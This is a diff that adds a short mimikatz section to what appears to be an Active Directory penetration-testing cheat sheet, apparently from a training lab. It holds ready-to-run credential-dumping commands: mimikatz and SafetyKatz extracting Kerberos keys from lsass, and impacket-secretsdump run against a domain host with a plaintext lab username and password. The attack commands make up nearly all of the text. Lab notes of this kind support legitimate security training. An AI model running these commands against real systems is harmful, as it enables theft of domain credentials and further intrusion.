@@ -1,3 +1,21 @@
+### mimikatz
+mimikatz can be used to extract credentials, tickets, replay credentials,
+play with AD security and more.
+
+Dump credentials
+```powershell
+mimikatz.exe -Command '"sekurlsa::ekeys"'
+```
+
+Using SafetyKatz (Minidump of lsass and PELoader to run mimikatz)
+```powershell
+SafetyKatz.exe "sekurlsa::ekeys"
+```
+
+From a Linux attacking machine using `impacket`
+```bash
+impacket-secretsdump dcorp/student548:'P@ss123!'@172.16.42.10
+```
 
 
 
